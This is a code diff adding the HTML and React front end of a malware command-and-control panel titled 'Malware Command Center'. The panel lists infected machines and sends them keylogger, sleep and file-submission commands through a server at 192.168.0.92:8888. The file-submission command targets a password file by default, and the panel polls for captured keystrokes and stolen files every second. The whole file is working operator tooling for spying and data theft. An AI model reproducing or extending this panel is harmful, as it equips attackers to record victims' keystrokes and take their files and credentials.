@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>C and C</title>
+	<script type="text/javascript" src="/node_modules/react/dist/react.js"></script>
+	<script type="text/javascript" src="/node_modules/react-dom/dist/react-dom.js"></script>
+	<script type="text/javascript" src="/node_modules/jquery/dist/jquery.js"></script>
+	<script type="text/javascript" src="/node_modules/bootstrap/dist/js/bootstrap.js"></script>
+	<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/react/0.14.7/react.js"></script> -->
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/react/0.14.7/react-dom.js"></script> -->
+	<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js"></script> -->
+	<!-- <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script> -->
+	<!-- <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script> -->
+	<script type="text/javascript" src="/node_modules/classnames/index.js"></script>
+	<link rel="stylesheet" type="text/css" href="/node_modules/bootstrap/dist/css/bootstrap.css">
+	<!-- <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css"> -->
+</head>
+<body>
+	<div class="container">
+		<div id="content"></div>
+	</div>	
+<script type="text/javascript">
+	/*
+	 * Following Classes are React Elements for Right Hand Column (Dashboard)
+	 */
+	var MalwareCommand = React.createClass({
+		displayName: "MalwareCommand",
+		handleClick: function (event) {
+			this.props.updateActive(this.props._key)
+			$.ajax({
+				url: "http://192.168.0.92:8888/ui/update_command/",
+				type: "POST",
+				data: {
+					"token": this.props.malwareId,
+					"command": this.props.command,
+					"parameter": this.props.parameter
+				},
+				success: function (data) {
+					this.setState({
+						status: "active"
+					})
+				}
+			})
+		},
+		render: function (btnClass) {	
+			var active = false
+			if (this.props.activeId == this.props._key)
+			{
+				active = true
+				
+			}
+			var btnClass = classNames({
+					'btn': true,
+					'malwareButton': true,
+					'btn-default' : !active,
+					'btn-success' : active,
+				})
+			return (
+				React.createElement("div" , {},
+					React.createElement(
+						"div",
+						{className: "btn-group"},
+						React.createElement(
+							"button",
+							{
+								className: btnClass,
+								onClick: this.handleClick,								
+								style: {margin: "5px"}
+							},
+							this.props.name
+						)
+					)
+				)
+			)
+		}
+	})
+
+	var SubmitFile = React.createClass({
+		getInitialState: function() {
+			return {
+				fileData: "Someday we will get the file",
+				filePath: ""
+			}
+		},
+		getLastFile: function () {
+			$.ajax({ 
+				url : "http://192.168.0.92:8888/ui/file/",
+				type: "POST",
+				data: {
+					"token": this.props.malwareId
+				},
+				success: function (data) {
+					if (Object.keys(data).length == 0) { 
+						//
+					} else {
+						this.setState({
+							fileData: data.data,
+							filePath: data.path
+						})
+					}
+				}.bind(this)
+			})
+		},
+		componentDidMount: function () {
+			this.getLastFile();
+		},
+		render: function () {
+			return (
+				React.createElement(
+					"div",
+					{ 
+						className: "textBox", 
+					 	style: { 
+					 		border: "1px solid #aaa", 
+					 		width:"100%",
+					 		"marginTop": "10px",
+					 		padding: "10px",
+					 		"minHeight" : "200px" }
+					},
+					React.createElement(
+						"p",
+						{
+							className: "innerText",
+							style: { color: "#999" }
+						},
+						React.createElement("span", { style : { color: "#333" }}, "File Data: "),
+						this.state.fileData,
+						React.createElement("br", null),
+						React.createElement("span", { style : { color: "#333" }}, "File Path: "),
+						this.state.filePath
+					)
+				)
+			)
+		}
+	})
+
+	var Sleep = React.createClass({
+		render: function () {
+			return (
+				React.createElement(
+					"div",
+					{ 
+						className: "textBox", 
+					 	style: { 
+					 		border: "1px solid #aaa", 
+					 		width:"100%",
+					 		"marginTop": "10px",
+					 		padding: "10px",
+					 		"minHeight" : "200px" }
+					},
+					"Sleep command sent to Malware."
+				)
+			)
+		}
+	})
+
+	var Keylogger = React.createClass({
+		displayName: "keylogger",
+		getInitialState: function () {
+			return {
+				text: "No data yet captured.",
+				polling: false
+			}
+		},
+		getKeyloggerData: function () {
+			$.ajax({
+				url: "http://192.168.0.92:8888/ui/keylog/",
+				type: "POST",
+				data: {
+					"token": this.props.malwareId,
+				},
+		 		success: function (data) {
+					if (Object.keys(data).length == 0) {
+						this.setState({
+							text: "No data captured for this Malware" 
+						}) 
+					} else {
+						var json_data = JSON.parse(data);
+						this.setState({
+							text: json_data[0].fields.data
+						})
+					}				
+				}.bind(this),
+				error: function (xhr, status, err) {
+					console.error("", status, err.toString());
+				}
+			})
+		},
+		handleClick: function (event) {
+			var prevPolling = this.state.polling
+			this.setState({
+				polling: !this.state.polling
+			})
+			if (prevPolling != true) {
+				window.interval = setInterval(this.getKeyloggerData, 1000);
+			} else {
+				if (window.interval) {
+					clearInterval(window.interval);
+				}
+			}
+		},
+		componentDidMount: function () {
+			this.getKeyloggerData();
+			if (this.state.polling == true) {
+				window.interval = setInterval(this.getKeyloggerData, 1000);
+			}
+		},
+		componentWillUnmount: function () {
+			clearInterval(window.interval)
+		},
+		render: function () {
+			var btnClasses = classNames({
+				"btn": true,
+				"btn-default": !this.state.polling,
+				"btn-success": this.state.polling
+			})
+			if (this.state.polling == true) {
+				var btnText = "Polling"
+			} else {
+				var btnText = "Not Polling"
+			}
+			return (
+				React.createElement(
+					"div",
+					{ 
+						className: "textBox", 
+					 	style: { 
+					 		position: "relative",
+					 		border: "1px solid #aaa", 
+					 		width:"100%",
+					 		"marginTop": "10px",
+					 		padding: "10px",
+					 		"minHeight" : "200px" }
+					},
+					React.createElement(
+						"div",
+						null,
+						this.state.text
+					),
+					React.createElement(
+						"button",
+						{
+							className: btnClasses, 
+							onClick: this.handleClick,
+							style: {
+								position:"absolute",
+								right:"0",
+								top: "0",
+								margin: "5px",
+								width: "90px"
+							}
+						},
+						btnText
+					)
+				)
+			)
+		}
+	})
+
+	var CommandList = React.createClass({
+		getInitialState: function () {
+			return {
+				activeId: this.props.activeId
+			}
+		},
+		componentDidMount: function () {
+			console.log("did mount")
+			$.ajax({
+				url: "http://192.168.0.92:8888/ui/initial_command/",
+				type: "POST",
+				data: {
+					"token": this.props.malwareId
+				},
+				success: function (data) {
+					var json_data = JSON.parse(data)
+					console.log(json_data)
+					switch (json_data[0].fields.type) {
+						case 'sleep':
+							this.setState({
+								activeId: 1
+							})
+							break;
+						case 'keylogger':
+							this.setState({
+								activeId: 0
+							})
+							break;
+						case 'submit_file':
+							this.setState({
+								activeId: 2
+							})
+							break;
+					}
+				}.bind(this),
+				error: function (xhr, status, err) {
+					console.error("http://192.168.0.92:8888/ui/initial_command/", status, err.toString());
+				}
+			})
+		},
+		updateActive: function (id) {
+			if (this.state.activeId == id) {
+				this.setState({
+					activeId: null
+				})
+			} else {
+				this.setState({
+					activeId: id
+				})
+			}
+		},
+		render: function () {
+			var interactiveBox = React.createElement("div", {}, "Empty");
+
+			var cmds = [
+				{name: "Keylogger", key: 0, command: "keylogger", parameter: "10"},
+				{name: "Sleep", key: 1, command: "sleep", parameter: "10"},
+				{name: "Submit File", key: 2, command: "submit_file", parameter: "c://my_password.txt"}
+				]
+
+
+			switch (this.state.activeId) 
+				{
+					case 0: 
+						interactiveBox = React.createElement(Keylogger, { malwareId: this.props.malwareId });
+						break;
+					case 1: 
+						interactiveBox = React.createElement(Sleep, { malwareId: this.props.malwareId });
+						break;
+					case 2:
+						interactiveBox = React.createElement(SubmitFile, { malwareId: this.props.malwareId });
+						break;
+				}
+			return (
+				React.createElement(
+					"div",
+					null,
+					React.createElement(
+						"h5",
+						{className: "commandInfo"},
+						"Select Command (Green is Current Command)"
+					),
+					React.createElement(
+						"div",
+						{ 
+							displayName: "commandButtons",
+							className: "commandList btn-toolbar"
+						},
+						cmds.map(function (cmd) {
+							return (
+								React.createElement(
+									MalwareCommand,
+									{
+										name: cmd.name,
+										key: cmd.key,
+										_key: cmd.key,
+										command: cmd.command,
+										parameter: cmd.parameter,
+										malwareId: this.props.malwareId,
+										activeId: this.state.activeId,
+										updateActive: this.updateActive.bind(this, cmd.key)
+									}
+								)
+							)
+						}, this)
+					),
+					React.createElement(
+						"div",
+						{className: "interactiveBox"},
+						interactiveBox
+					)
+				)
+			)
+		}
+	})
+
+	var MalwareBoard = React.createClass({
+		render: function () {
+			return (
+				React.createElement(
+					"div",
+					{className: "allMalwares"},
+					this.props.malwares.map(function (malware) {
+						if (malware.fields.token == this.props.activeMalwareId)
+						{
+							return (
+								React.createElement(
+									CommandList,
+									{ 
+										key: malware.fields.token,
+										malwareId: malware.fields.token
+									}
+								)
+							)
+						} else {
+							React.createElement("div", null)
+						}
+					}, this)
+				)
+			)
+		}
+	})
+
+
+	/*
+	 * Following Classes are for left hand side selector column
+	 * MalwareList => MalwareItem
+	 */
+
+
+	var MalwareItem = React.createClass({
+		handleClick: function (event) {
+			if (this.props.activeMalwareId == this.props.id)
+			{
+				// Do Nothing
+			} else {
+				this.props.handleMalwareClick(this.props.id)
+			}
+		},
+		render: function () {
+			var malwareIdString = "Id: " + this.props.id.toString().substring(0, 24);
+			var groupMemberString = "Group: " + this.props.group.toString();
+			if (this.props.activeMalwareId == this.props.id)
+			{
+				var btnClasses = classNames({
+					"list-group-item": true,
+					"list-group-item-success": true
+				})	
+			} else {
+				var btnClasses = classNames({
+					"list-group-item": true,
+					"list-group-item-success": false
+				})
+			}
+			return (
+				React.createElement(
+					"button",
+					{
+						style: { "outline":"none"},
+						className: btnClasses, 
+						onClick: this.handleClick
+					},
+					React.createElement(
+						"div",
+						{className: "groupMembers"},
+						groupMemberString
+					),
+					React.createElement(
+						"div",
+						{
+							className: "malwareId"
+						},
+						malwareIdString 
+					)
+				)
+			)
+		}
+	})
+
+	var MalwareList = React.createClass({
+		render: function (){
+			console.log(this.props.malwares)
+			return (
+				React.createElement(
+					"div",
+					{ className: "list-group"},
+					this.props.malwares.map(function (malware) {
+						return (
+							React.createElement(
+								MalwareItem,
+								{
+									key: malware.fields.token,
+									id: malware.fields.token,
+									group: malware.fields.teammates,
+									activeMalwareId: this.props.activeMalwareId,
+									handleMalwareClick: this.props.handleMalwareClick
+								}
+							)
+						)
+					}, this)
+				)
+			)
+		}
+	})
+
+	/*
+	 * Virtual DOM Entry Class
+	 */
+
+	var MainPage = React.createClass({
+		getInitialState: function () {
+			return {
+				activeMalwareId: null,
+				malwares: []
+
+			}
+		},
+		loadMalwaresFromServer: function () {
+			$.ajax({
+				url: "http://192.168.0.92:8888/ui/all_malwares/",
+				type: "GET",
+				success: function (data) {
+					var json_data = JSON.parse(data);
+
+					this.setState({ 
+						malwares: json_data
+					})
+				}.bind(this),
+				error: function(xhr, status, err) {
+					console.error(this.props.url, status, err.toString());
+				}.bind(this)
+			})
+		},
+		componentDidMount: function () {
+			this.loadMalwaresFromServer()
+		},
+		handleMalwareSwitch: function (activeMalwareId) {
+			console.log(activeMalwareId)
+			this.setState({
+				activeMalwareId: activeMalwareId
+			})
+		},
+		render: function () {
+			if (this.state.activeMalwareId == null) {
+				var malwareBoardElement = React.createElement("div", 
+					{
+						className: "noMalware",
+						style: {
+								position:"absolute",
+								top:'0',
+								left:'0',
+								width:'100%',
+								"transform":"translate(0%, 50%)",
+								"textAlign":"center",
+								"height": "137px",
+								"fontSize": "32px",
+								"color":"#444" 
+							}
+					}, 
+					"Select your malware");
+			} else {
+				var malwareBoardElement = React.createElement(
+					MalwareBoard, 
+					{ 
+						malwares: this.state.malwares, 
+					  	activeMalwareId: this.state.activeMalwareId
+					}
+				)
+			}
+			return (
+				React.createElement(
+					"div", null,
+					React.createElement(
+						"div",
+						{
+							className: "row", 
+							style: {"paddingLeft":"15px"}
+						},
+						React.createElement(
+							"div",
+							{ className: "page-header" },
+							React.createElement("h2", null, "Malware Command Center")
+						)
+					),
+					React.createElement(
+						"div",
+						{className: "row"},
+						React.createElement(
+							"div", 
+							{ className: "col-sm-4" },
+							React.createElement(MalwareList, 
+								{
+									malwares: this.state.malwares, 
+									activeMalwareId: this.state.activeMalwareId,
+									handleMalwareClick: this.handleMalwareSwitch
+								})
+						),
+						React.createElement(
+							"div",
+							{ className: "col-sm-8" },
+							malwareBoardElement
+						)
+					)
+				)
+			)
+		}
+	})
+
+
+	$(document).ready(function () {
+		ReactDOM.render(
+			React.createElement(MainPage, null),
+			$("#content")[0]
+		)
+	})
+
+
+
+</script>
+</body>
+</html>
